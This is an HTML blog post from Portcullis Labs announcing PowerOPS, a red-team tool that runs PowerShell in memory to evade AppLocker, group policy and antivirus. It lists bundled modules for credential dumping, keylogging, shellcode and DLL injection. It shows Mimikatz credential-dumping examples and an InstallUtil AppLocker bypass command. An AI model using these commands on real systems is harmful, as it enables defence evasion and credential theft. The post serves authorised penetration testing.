@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en-US" xmlns:fb="https://www.facebook.com/2008/fbml" xmlns:addthis="https://www.addthis.com/help/api-spec"  prefix="og: http://ogp.me/ns#">
+<head>
+<meta charset="UTF-8" />
+<title>PowerOPS: PowerShell for Offensive Operations | Portcullis Labs</title>
+<meta name="viewport" content="initial-scale = 1.0, maximum-scale = 1.0, user-scalable = no, width = device-width">
+<!--[if lt IE 9]><script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+<link rel="stylesheet" href="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/style.css" media="screen" />
+
+
+<!-- This site is optimized with the Yoast WordPress SEO plugin v1.4.7 - http://yoast.com/wordpress/seo/ -->
+<link rel="canonical" href="https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/" />
+<meta property='og:locale' content='en_US'/>
+<meta property='og:type' content='article'/>
+<meta property='og:title' content='PowerOPS: PowerShell for Offensive Operations - Portcullis Labs'/>
+<meta property='og:url' content='https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/'/>
+<meta property='og:site_name' content='Portcullis Labs'/>
+<!-- / Yoast WordPress SEO plugin. -->
+
+<link rel="alternate" type="application/rss+xml" title="Portcullis Labs &raquo; Feed" href="https://labs.portcullis.co.uk/feed/" />
+<link rel='stylesheet' id='TheStyleSheets-css'  href='https://labs.portcullis.co.uk/wp-content/plugins/asm-brush/style.css?ver=3.8.5' type='text/css' media='all' />
+<link rel='stylesheet' id='wpfb-css'  href='//labs.portcullis.co.uk/wp-content/plugins/wp-filebase/wp-filebase.css?t=1475825177&#038;ver=3.4.4' type='text/css' media='all' />
+<link rel='stylesheet' id='contact-form-7-css'  href='https://labs.portcullis.co.uk/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=3.3.2' type='text/css' media='all' />
+<link rel='stylesheet' id='css3lightbox_style-css'  href='https://labs.portcullis.co.uk/wp-content/plugins/css3lightbox/assets/style.css?ver=3.8.5' type='text/css' media='all' />
+<link rel='stylesheet' id='addthis_all_pages-css'  href='https://labs.portcullis.co.uk/wp-content/plugins/addthis/frontend/build/addthis_wordpress_public.min.css?ver=3.8.5' type='text/css' media='all' />
+<!--[if lte IE 7]>
+<link rel='stylesheet' id='style.ie7.css-css'  href='https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/style.ie7.css?ver=3.8.5' type='text/css' media='screen' />
+<![endif]-->
+<link rel='stylesheet' id='style.responsive.css-css'  href='https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/style.responsive.css?ver=3.8.5' type='text/css' media='all' />
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/jquery.js?ver=3.8.5'></script>
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/script.js?ver=3.8.5'></script>
+<script type='text/javascript' src='https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/script.responsive.js?ver=3.8.5'></script>
+
+ 
+
+<link rel="shortcut icon" href="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/favicon.ico" /><link rel='header_link' href='/' /><style type="text/css" id="syntaxhighlighteranchor"></style>
+<script data-cfasync="false" type="text/javascript">if (window.addthis_product === undefined) { window.addthis_product = "wpp"; } if (window.wp_product_version === undefined) { window.wp_product_version = "wpp-6.1.4"; } if (window.wp_blog_version === undefined) { window.wp_blog_version = "3.8.5"; } if (window.addthis_share === undefined) { window.addthis_share = {}; } if (window.addthis_config === undefined) { window.addthis_config = {"data_track_clickback":false,"ignore_server_config":true,"ui_atversion":300}; } if (window.addthis_layers === undefined) { window.addthis_layers = {}; } if (window.addthis_layers_tools === undefined) { window.addthis_layers_tools = []; } else {  } if (window.addthis_plugin_info === undefined) { window.addthis_plugin_info = {"info_status":"enabled","cms_name":"WordPress","plugin_name":"Share Buttons by AddThis","plugin_version":"6.1.4","plugin_mode":"WordPress","anonymous_profile_id":"wp-3219ffbb80dfd9f649eb0d9d76c4d2e4","page_info":{"template":"posts","post_type":""},"sharing_enabled_on_post_via_metabox":false}; } 
+                    (function() {
+                      var first_load_interval_id = setInterval(function () {
+                        if (typeof window.addthis !== 'undefined') {
+                          window.clearInterval(first_load_interval_id);
+                          if (typeof window.addthis_layers !== 'undefined' && Object.getOwnPropertyNames(window.addthis_layers).length > 0) {
+                            window.addthis.layers(window.addthis_layers);
+                          }
+                          if (Array.isArray(window.addthis_layers_tools)) {
+                            for (i = 0; i < window.addthis_layers_tools.length; i++) {
+                              window.addthis.layers(window.addthis_layers_tools[i]);
+                            }
+                          }
+                        }
+                     },1000)
+                    }());
+                </script> <script data-cfasync="false" type="text/javascript"src="https://s7.addthis.com/js/300/addthis_widget.js#pubid=ra-50cef03053621092" async="async"></script><meta name="norton-safeweb-site-verification" content="t4bvmzb47z4-fa69d4guwu4ud9-4fjyp-p5zu1zngnplt83xrfxxg18yea8ev95lh9h4vlzkclbcvyu37rz5etuoczh7z3827pjv3s73uannz0xkwzfw2iiu4ol7o83f" />
+</head>
+<body class="single single-post postid-5467 single-format-standard">
+
+<div id="portcullis-main">
+
+
+<!-- Cisco -->
+<div id="cisco">
+    <div id="cisco-container" class="clearfix">
+        <div class="left">
+            <a href="http://www.cisco.com/" target="_blank"><img class="cisco-logo" src="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/images/portcullis_cisco_logo.png" alt=""></a>
+            <a href="http://www.cisco.com/web/about/ac49/ac0/ac1/ac259/portcullis.html" class="learnmore">Learn More <img src="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/images/more-triangle.png" alt=""></a>
+        </div>
+        <div class="right">
+            <div class="move-right"><a href="http://www.cisco.com/web/about/index.html" target="_blank" class="move-right">About Cisco</a></div>
+        </div>
+    </div>
+</div>
+<!-- /#cisco -->
+
+<header class="clearfix portcullis-header clickable">
+
+
+    <div class="portcullis-shapes">
+		<div class="portcullis-headline" data-left="14.6%">
+    <a href="https://labs.portcullis.co.uk/">Portcullis Labs</a>
+</div>
+		<div class="portcullis-slogan" data-left="16.4%">Research and Development</div>
+<div class="logo"><a href="https://www.portcullis-security.com"><img style="border:none;" src="/wp-content/themes/Portcullisfinal/images/logo.png" /></a></div>
+
+<div class="portcullis-textblock portcullis-object1741532833" data-left="92.34%">
+    
+</div><div class="portcullis-textblock portcullis-object1269462037" data-left="97.93%">
+    
+</div>
+            </div>
+
+<nav class="portcullis-nav clearfix">
+    
+<ul class="portcullis-hmenu">
+	<li class="menu-item-268"><a href="https://labs.portcullis.co.uk" title="Home">Home</a>
+	</li>
+	<li class="menu-item-6568"><a href="https://labs.portcullis.co.uk/advisories/" title="Advisories">Advisories</a>
+	</li>
+	<li class="menu-item-83"><a href="https://labs.portcullis.co.uk/blog/" title="Blog">Blog</a>
+	</li>
+	<li class="menu-item-66"><a href="https://labs.portcullis.co.uk/presentations/" title="Presentations">Presentations</a>
+	</li>
+	<li class="menu-item-62"><a href="https://labs.portcullis.co.uk/tools/" title="Tools">Tools</a>
+	</li>
+	<li class="menu-item-64"><a href="https://labs.portcullis.co.uk/whitepapers/" title="Whitepapers">Whitepapers</a>
+	</li>
+	<li class="menu-item-59"><a href="https://labs.portcullis.co.uk/downloads/" title="Downloads">Downloads</a>
+	</li>
+</ul>
+ 
+    </nav>
+
+                    
+</header>
+
+<div class="portcullis-sheet clearfix">
+            <div class="portcullis-layout-wrapper clearfix">
+                <div class="portcullis-content-layout">
+                    <div class="portcullis-content-layout-row">
+                        <div class="portcullis-layout-cell portcullis-content clearfix">
+							<article id="post-5467"  class="portcullis-post portcullis-article  post-5467 post type-post status-publish format-standard hentry category-blog tag-red-team tag-windows">
+                                <div class="portcullis-postmetadataheader"><h1 class="portcullis-postheader">PowerOPS: PowerShell for Offensive Operations</h1></div>                                                <div class="portcullis-postheadericons portcullis-metadata-icons"><span class="portcullis-postdateicon"><span class="date">Published</span> <span class="entry-date" title="13:17">03/06/2016</span></span> | <span class="portcullis-postauthoricon"><span class="author">By</span> <span class="author vcard"><a class="url fn n" href="https://labs.portcullis.co.uk/author/rfr/" title="View all posts by RFR">RFR</a></span></span></div>                <div class="portcullis-postcontent clearfix"><div class="at-above-post addthis_tool" data-url="https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/"></div><!-- AddThis Button BEGIN -->
+<div class="addthis_toolbox addthis_default_style "><a class="addthis_button_email"><a class="addthis_button_twitter"></a><a class="addthis_button_reddit"></a></a>
+</div><p>At Portcullis, one of the most frequent assessments we perform are breakouts. One of the main challenges we face during these assessments is to get command execution that can either help escalate our privileges or allow us to gain access to different systems on the network. <span id="more-5467"></span></p>
+<p>Sometimes we find harsh group policy restrictions in place that block access to the Windows Command Prompt, PowerShell, among others. These, however, are not always properly implemented, i.e. they do not block access to all executables (and allow only certain programs to run).</p>
+<p>After getting command execution, we want to attack other systems on the network. However it isn&#8217;t always easy to get a flexible toolbox in the system that allow us to gather information and launch further attacks. PowerShell is our preferred post-exploitation language and powershell.exe access is usually blocked (as .ps1 scripts). However since the block is often incorrectly implemented, i.e. the DLLs used by PowerShell aren&#8217;t usually blocked, this can open some doors. On top of that some AVs started implementing some basic signatures that will pick some well known PowerShell scripts. The bypass is trivial but we want to be as stealthy as possible and it still delay us a bit. </p>
+<p>How can we bypass some of these &#8220;security mitigations&#8221; and speed up our tests? PowerOPS is an application written in C# that does not rely on powershell.exe but runs PowerShell commands and functions within a PowerShell runspace environment (.NET). Besides this, it includes multiple offensive PowerShell modules to make the process of post-exploitation easier.</p>
+<p>It tries to follow the KISS principle, being as simple as possible. The main goal is to make it easy to use PowerShell offensively and help to evade Anti-Virus and other mitigations.</p>
+<p>To do this, it:</p>
+<ul>
+<li>Doesn&#8217;t rely on powershell.exe, it calls PowerShell directly through the .NET framework, which might help bypassing security controls like GPO, SRP and App Locker</li>
+<li>Powershell functions within the Runspace are loaded in memory from Base64 Encoded Strings and never touch disk, evading most Anti-Virus engines</li>
+</ul>
+<h2>What’s inside the runspace?</h2>
+<p><a title="PowerShellMafia/Powersploit" href="https://github.com/PowerShellMafia/PowerSploit">PowerShellMafia/Powersploit</a></p>
+<ul>
+<li>Get-Keystrokes</li>
+<li>Invoke-DllInjection</li>
+<li>Invoke-Mimikatz</li>
+<li>Invoke-NinjaCopy</li>
+<li>Invoke-Shellcode</li>
+<li>Invoke-ReflectivePEInjection</li>
+<li>Invoke-TokenManipulation</li>
+<li>Invoke-WMICommand</li>
+<li>PowerUp</li>
+<li>PowerView</li>
+</ul>
+<p><a title="Nishang" href="https://github.com/samratashok/nishang">Nishang</a></p>
+<ul>
+<li>Get-Information</li>
+<li>Get-PassHashes</li>
+<li>Port-Scan</li>
+</ul>
+<p><a title="Auto-GPPPassword" href="https://github.com/roo7break/PowerShell-Scripts/blob/master/auto-gpppassword/auto-gpppassword.ps1">Auto-GPPPassword</a></p>
+<p><a title="PowerCat" href="https://github.com/besimorhino/powercat">PowerCat</a></p>
+<p><a title="Get-ProductKey" href="https://gallery.technet.microsoft.com/scriptcenter/Get-product-keys-of-local-83b4ce97">Get-ProductKey</a></p>
+<p><a title="Empire" href="https://github.com/PowerShellEmpire/">Empire</a></p>
+<ul>
+<li>Invoke-Psexec</li>
+<li>Invoke-SSHCommand</li>
+</ul>
+<p>Additionally you can run any valid PowerShell command.</p>
+<h2>Where to get it?</h2>
+<p>The source code is available at <a title="GitHub" href="https://github.com/fdiskyou/PowerOPS">GitHub</a>.</p>
+<h2>How to compile it</h2>
+<p>To compile PowerOPS you need to import this project within Microsoft Visual Studio or if you don&#8217;t have access to a Visual Studio installation, you can compile it as follows:</p>
+<p>To compile it as an x86 binary:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+C:\&gt; cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\&gt; csc.exe /unsafe /reference:&quot;C:\path\to\System.Management.Automation.dll&quot; /reference:System.IO.Compression.dll /out:C:\users\username\PowerOPS_x86.exe /platform:x86 &quot;C:\path\to\PowerOPS\PowerOPS\*.cs&quot;
+</pre>
+<p>To compile it as an x64 binary:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+C:\&gt; cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\&gt; csc.exe /unsafe /reference:&quot;C:\path\to\System.Management.Automation.dll&quot; /reference:System.IO.Compression.dll /out:C:\users\username\PowerOPS_x64.exe /platform:x64 &quot;C:\path\to\PowerOPS\PowerOPS\*.cs&quot;
+</pre>
+<p>PowerOPS uses the System.Management.Automation namespace, so make sure you have the System.Management.Automation.dll within your source path when compiling outside of Visual Studio.</p>
+<h2>How to use it</h2>
+<p>Just run the binary and type show to list available modules.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+PS &gt; show
+
+[-] This computer is not part of a Domain! Some functions will not work!
+
+[+] Nishang
+
+ Get-Information    Get-PassHashes             Port-Scan
+
+[+] PowerSploit
+
+ Get-KeyStrokes     Invoke-DllInjection        Invoke-Mimikatz     Invoke-NinjaCopy
+ Invoke-Shellcode   Invoke-TokenManipulation   Invoke-WmiCommand   Invoke-ReflectivePEInjection
+ PowerView          PowerUp
+
+[+] Empire
+
+ Invoke-PsExec      Invoke-SSHCommand
+
+[+] Others
+
+ Auto-GPPPassword   Get-ProductKey             PowerCat
+
+PS &gt;
+</pre>
+<p>PowerUp and PowerView are loaded as modules, so Get-Command -module will show you all available functions.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+PS &gt; get-command -module powerup
+
+CommandType     Name                                               ModuleName
+-----------     ----                                               ----------
+Function        Find-DLLHijack                                     PowerUp
+Function        Find-PathHijack                                    PowerUp
+Function        Get-ApplicationHost                                PowerUp
+Function        Get-ModifiableFile                                 PowerUp
+Function        Get-RegAlwaysInstallElevated                       PowerUp
+Function        Get-RegAutoLogon                                   PowerUp
+Function        Get-ServiceDetail                                  PowerUp
+Function        Get-ServiceFilePermission                          PowerUp
+Function        Get-ServicePermission                              PowerUp
+Function        Get-ServiceUnquoted                                PowerUp
+Function        Get-UnattendedInstallFile                          PowerUp
+Function        Get-VulnAutoRun                                    PowerUp
+Function        Get-VulnSchTask                                    PowerUp
+Function        Get-Webconfig                                      PowerUp
+Function        Install-ServiceBinary                              PowerUp
+Function        Invoke-AllChecks                                   PowerUp
+Function        Invoke-ServiceAbuse                                PowerUp
+Function        Invoke-ServiceDisable                              PowerUp
+Function        Invoke-ServiceEnable                               PowerUp
+Function        Invoke-ServiceStart                                PowerUp
+Function        Invoke-ServiceStop                                 PowerUp
+Function        Restore-ServiceBinary                              PowerUp
+Function        Test-ServiceDaclPermission                         PowerUp
+Function        Write-HijackDll                                    PowerUp
+Function        Write-ServiceBinary                                PowerUp
+Function        Write-UserAddMSI                                   PowerUp
+
+PS &gt;
+</pre>
+<p>All your PowerShell fu applies. PowerOPS is basically a PowerShell shell with some modules/functions pre-loaded. So Get-Help is your friend and will help you to understand how the modules can be used.</p>
+<p>Let&#8217;s say you want to see examples on how to use Invoke-Mimikatz.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+PS &gt; Get-Help Invoke-Mimikatz -examples
+
+NAME
+    Invoke-Mimikatz
+
+SYNOPSIS
+    This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to
+    reflectively load Mimikatz completely in memory. This allows you to do
+    things such as
+    dump credentials without ever writing the mimikatz binary to disk.
+    The script has a ComputerName parameter which allows it to be executed
+    against multiple computers.
+
+    This script should be able to dump credentials from any version of Windows
+    through Windows 8.1 that has PowerShell v2 or higher installed.
+
+    Function: Invoke-Mimikatz
+    Author: Joe Bialek, Twitter: @JosephBialek
+    Mimikatz Author: Benjamin DELPY `gentilkiwi`. Blog:
+    http://blog.gentilkiwi.com. Email: benjamin@gentilkiwi.com. Twitter
+    @gentilkiwi
+    License:  http://creativecommons.org/licenses/by/3.0/fr/
+    Required Dependencies: Mimikatz (included)
+    Optional Dependencies: None
+    Version: 1.5
+    ReflectivePEInjection version: 1.1
+    Mimikatz version: 2.0 alpha (2/16/2015)
+
+    -------------------------- EXAMPLE 1 --------------------------
+
+    C:\PS&gt;Execute mimikatz on the local computer to dump certificates.
+
+
+    Invoke-Mimikatz -DumpCerts
+
+
+    -------------------------- EXAMPLE 2 --------------------------
+
+    C:\PS&gt;Execute mimikatz on two remote computers to dump credentials.
+
+
+    Invoke-Mimikatz -DumpCreds -ComputerName @(&quot;computer1&quot;, &quot;computer2&quot;)
+
+
+    -------------------------- EXAMPLE 3 --------------------------
+
+    C:\PS&gt;Execute mimikatz on a remote computer with the custom command
+    &quot;privilege::debug exit&quot; which simply requests debug privilege and exits
+
+
+    Invoke-Mimikatz -Command &quot;privilege::debug exit&quot; -ComputerName &quot;computer1&quot;
+
+
+PS &gt;
+</pre>
+<p>Or simply look at the whole help available for Invoke-DllInjection.</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+PS &gt; Get-Help Invoke-DllInjection -full
+
+NAME
+    Invoke-DllInjection
+
+SYNOPSIS
+    Injects a Dll into the process ID of your choosing.
+
+    PowerSploit Function: Invoke-DllInjection
+    Author: Matthew Graeber (@mattifestation)
+    License: BSD 3-Clause
+    Required Dependencies: None
+    Optional Dependencies: None
+
+SYNTAX
+    Invoke-DllInjection [-ProcessID] &lt;Int32&gt; [-Dll] &lt;String&gt;
+    [&lt;CommonParameters&gt;]
+
+
+DESCRIPTION
+    Invoke-DllInjection injects a Dll into an arbitrary process.
+
+
+PARAMETERS
+    -ProcessID &lt;Int32&gt;
+        Process ID of the process you want to inject a Dll into.
+
+        Required?                    true
+        Position?                    1
+        Default value                0
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    -Dll &lt;String&gt;
+        Name of the dll to inject. This can be an absolute or relative path.
+
+        Required?                    true
+        Position?                    2
+        Default value
+        Accept pipeline input?       false
+        Accept wildcard characters?  false
+
+    &lt;CommonParameters&gt;
+        This cmdlet supports the common parameters: Verbose, Debug,
+        ErrorAction, ErrorVariable, WarningAction, WarningVariable,
+        OutBuffer, PipelineVariable, and OutVariable. For more information, see
+        about_CommonParameters (http://go.microsoft.com/fwlink/?LinkID=113216).
+
+INPUTS
+
+OUTPUTS
+
+NOTES
+        Use the '-Verbose' option to print detailed information.
+
+    -------------------------- EXAMPLE 1 --------------------------
+
+    C:\PS&gt;Invoke-DllInjection -ProcessID 4274 -Dll evil.dll
+
+
+    Description
+    -----------
+    Inject 'evil.dll' into process ID 4274.
+
+RELATED LINKS
+
+http://www.exploit-monday.com
+
+PS &gt;
+</pre>
+<p>You can play around with the output&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+PS &gt; get-productkey
+
+OSDescription        Computername        OSVersion           ProductKey
+-------------        ------------        ---------           ----------
+Microsoft Windows... VISUALSTUDIO        6.1.7601            ABCDE-54321-UVXY...
+
+
+
+PS &gt; get-productkey | format-list
+
+
+OSDescription : Microsoft Windows 7 Professional N
+Computername  : VISUALSTUDIO
+OSVersion     : 6.1.7601
+ProductKey    : ABCDE-54321-UVXYZ-12345-LMNOP
+</pre>
+<p>Save the output of your commands the way you want&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+PS &gt; invoke-allchecks | Out-File -Encoding ascii powerup.output.txt
+
+PS &gt; type powerup.output.txt
+
+[*] Running Invoke-AllChecks
+
+[*] Checking if user is in a local group with administrative privileges...
+[+] User is in a local group that grants administrative privileges!
+[+] Run a BypassUAC attack to elevate privileges to admin.
+
+[*] Checking for unquoted service paths...
+
+[*] Checking service executable and argument permissions...
+
+[*] Checking service permissions...
+
+[*] Checking %PATH% for potentially hijackable .dll locations...
+
+[*] Checking for AlwaysInstallElevated registry key...
+
+[*] Checking for Autologon credentials in registry...
+
+[*] Checking for vulnerable registry autoruns and configs...
+
+[*] Checking for vulnerable schtask files/configs...
+
+[*] Checking for unattended install files...
+
+[*] Checking for encrypted web.config strings...
+
+[*] Checking for encrypted application pool and virtual directory passwords...
+
+PS &gt;
+</pre>
+<p>Do some math&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+PS &gt; $a=1
+
+PS &gt; $b=4
+
+PS &gt; $c=$a+$b
+
+PS &gt; echo $c
+5
+</pre>
+<p>Browse the file system&#8230;</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+PS &gt; cd c:\
+
+PS &gt; ls
+
+    Directory: C:\
+
+Mode                LastWriteTime     Length Name
+----                -------------     ------ ----
+d----        14/02/2016     17:21            bin
+d----        17/02/2016     15:02            Dev-Cpp
+d----        14/07/2009     04:20            PerfLogs
+d-r--        26/04/2016     20:00            Program Files
+d-r--        26/04/2016     20:00            Program Files (x86)
+d----        19/02/2016     21:06            Python27
+d-r--        26/11/2015     17:20            Users
+d----        12/05/2016     15:53            Windows
+-a---        19/03/2010     23:55    2073703 VS_EXPBSLN_x64_enu.CAB
+-a---        19/03/2010     23:58     551424 VS_EXPBSLN_x64_enu.MSI
+
+PS &gt; pwd
+
+Path
+----
+C:\
+
+PS &gt;
+</pre>
+<p>And so on&#8230;</p>
+<p><a title="PowerShell v5" href="https://mva.microsoft.com/en-US/training-courses/what-s-new-in-powershell-v5-16434">PowerShell v5</a> is coming with some new security features that will certainly affect some of the payloads contained in PowerOPS, so further development is expected as well as addition of new attack modules.</p>
+<h3>AppLocker bypass</h3>
+<p>PowerOPS includes the InstallUtil AppLocker bypass technique from <a title="Casey Smith" href="https://twitter.com/subTee">Casey Smith</a>. To make use of it run as shown below:</p>
+<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
+C:\&gt; cd \Windows\Microsoft.NET\Framework\v4.0.30319 (Or newer .NET version folder)
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\&gt; InstallUtil.exe /logfile= /LogToConsole=false /U C:\path\to\PowerOPS.exe
+</pre>
+<h4>Credits</h4>
+<p>PowerOPS was inspired by <a title="Cn33liz/p0wnedShell" href="https://github.com/Cn33liz/p0wnedShell">Cn33liz/p0wnedShell</a>, and basically consists of work from <a title="Nikhil Mittal" href="http://www.labofapenetrationtester.com/">Nikhil Mittal</a> of Nishang, <a title="mattifiestation" href="https://twitter.com/mattifestation">mattifiestation</a> of PowerSploit and <a title="sixdub" href="https://twitter.com/sixdub">sixdub</a>, <a title="engima0x3" href="https://twitter.com/enigma0x3">engima0x3</a> and <a title="harmj0y" href="https://twitter.com/HarmJ0y">harmj0y</a> of Empire.</p>
+<br /> <div class="wpcf7" id="wpcf7-f375-p238-o1"><form action="/contact/" method="post" class="wpcf7-form">
+<div style="display: none;">
+<input type="hidden" name="_wpcf7" value="323" />
+<input type="hidden" name="_wpcf7_version" value="3.3.2" />
+<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f375-p238-o1" />
+<input type="hidden" name="_wpnonce" value="4c6cc9abab" />
+</div>
+<style>.portcullis-content .layout-item-0 { background: ; padding: 10px;  }
+.portcullis-content .layout-item-1 {  border-collapse: separate;  }
+.portcullis-content .layout-item-2 { border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-color:#C7C7C7;border-right-color:#C7C7C7;border-bottom-color:#C7C7C7;border-left-color:#C7C7C7; color: #1C1C1C; background: #FAFAFA url('https://www.portcullis-security.com/wp-content/uploads/2013/01/983aa2.png') scroll; padding: 10px; border-radius: 5px;  }
+.ie7 .post .layout-cell {border:none !important; padding:0 !important; }
+.ie6 .post .layout-cell {border:none !important; padding:0 !important; }</p>
+</style>
+<div class="portcullis-content-layout layout-item-1">
+<div class="portcullis-content-layout-row">
+<div class="portcullis-layout-cell layout-item-2" style="width: 80%" >
+</p>
+</p>
+<h3>Request to be added to the Portcullis Labs newsletter</h3>
+<p>
+ We will email you whenever a new tool, or post is added to the site.</p>
+<p>Your Name (required)<br />
+    <span class="wpcf7-form-control-wrap your-name"><input type="text" name="your-name" value="" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" size="40" required="required" /></span> </p>
+<p>Your Email (required)<br />
+    <span class="wpcf7-form-control-wrap your-email"><input type="text" name="your-email" value="" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email" size="40" required="required" /></span> </p>
+<p><input type="hidden" name="porpoise" value="newsletter" /><br />
+<input type="hidden" name="contact_form_7_recaptcha" value="g-recaptcha-jKjmBUwalODKg9R" class="g-recaptcha-explicit-id"><div id="g-recaptcha-jKjmBUwalODKg9R"></div><span class="wpcf7-form-control-wrap g-recaptcha-explicit" data-sitekey="6LdFERITAAAAAJKGS2TEXuWsyOxc-KxvAZBC8zE2"></span></p>
+<p><input type="submit" value="Subscribe" class="wpcf7-form-control  wpcf7-submit" /></p>
+</div>
+</div>
+</div>
+<div class="wpcf7-response-output wpcf7-display-none"></div></form></div></br ><div style="clear:both;"></div><!-- AddThis Advanced Settings above via filter on the_content --><!-- AddThis Advanced Settings below via filter on the_content --><!-- AddThis Button BEGIN -->
+<div class="addthis_toolbox addthis_toolbox addthis_default_style addthis_32x32_style"><a class="addthis_button_email"><a class="addthis_button_twitter"></a><a class="addthis_button_reddit"></a></a>
+</div><!-- AddThis Advanced Settings generic via filter on the_content --><!-- AddThis Share Buttons above via filter on the_content --><!-- AddThis Share Buttons below via filter on the_content --><div class="at-below-post addthis_tool" data-url="https://labs.portcullis.co.uk/blog/powerops-powershell-for-offensive-operations/"></div><!-- AddThis Share Buttons generic via filter on the_content --></div>
+                                                                
+</article>
+				
+
+                        </div>
+                                            </div>
+                </div>
+            </div><footer class="portcullis-footer clearfix"><div class="portcullis-content-layout">
+    <div class="portcullis-content-layout-row">
+    <div class="portcullis-layout-cell" style="width: 100%">
+        <p><br></p>
+    </div>
+    </div>
+</div>
+<div class="portcullis-content-layout">
+    <div class="portcullis-content-layout-row">
+    <div class="portcullis-layout-cell" style="width: 33%">
+        <p style="text-align: left;"><span style="font-size: 17px; padding-left:40px; font-family: Tahoma;"><span style="color: #ffffff;">Research and Development</span><br></span></p>
+        <ul>
+        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/advisories/">Advisories</a><br></span></li>
+        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/blog/">Blog</a><br></span></li>
+        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/presentations/">Presentations</a><br></span></li>
+        <li style="text-align: left; padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/tools/">Tools</a><br></span></li>
+        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/whitepapers/">Whitepapers</a><br></span></li>
+        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/downloads/">Downloads</a><br></span></li>
+               </ul>
+        <p><br></p>
+    </div><div class="portcullis-layout-cell" style="width: 34%">
+        <p style="text-align: left;"><span style="font-size: 17px;"><span style="font-family: Tahoma;"><span style="font-weight: normal; color: #ffffff;">Company</span><br></span></span></p>
+        <ul>
+       <li style="text-align: left;"><span style="font-family: Tahoma;"><a href="https://labs.portcullis.co.uk/contact-us/">Contact Us</a><span style="font-size: 12px;"><br></span></span></li>
+        <li style="text-align: left;"><span style="font-family: Tahoma;"><a href="https://www.portcullis-security.com">Portcullis Computer Security Services</a><span style="font-size: 12px;"><br></span></span></li>
+                </ul>
+        <br>
+    </div><div class="portcullis-layout-cell" style="width: 33%">
+       <span style="color: #ffffff;"><br>
+        <br>
+        <p style="text-align: left;"><span style="color: #ffffff; font-family: Tahoma;"><span style="color: #ffffff;"><span style="font-size: 15px; color: #ffffff;">Follow Us</span> <span style="font-weight: bold;"> <a href="http://www.twitter.com/portcullislabs" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Portcullis Twitter" class="" src="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/images/twitterfooter.png"></a> <a href="http://www.linkedin.com/company/portcullis?trk=hb_tab_compy_id_505813" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Portcullis Linkedin" class="" src="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/images/linkedinfooter.png"></a> <a href="http://www.facebook.com/PortcullisCSL" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Portcullis Facebook" class="" src="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/images/facebookfooter.png"></a> <a href="https://plus.google.com/114151721382021849037/posts" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Google Plus" class="" src="https://labs.portcullis.co.uk/wp-content/themes/Portcullisfinal/images/googleplusfooter.png"></a> <a href="/rss" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Portcullis Rss" class=""img src="https://labs.portcullis.co.uk/wp-content/uploads/2013/04/rss.png"></a></span></span></span></p>
+        <p><br></p>
+    </div>
+    </div>
+</div>
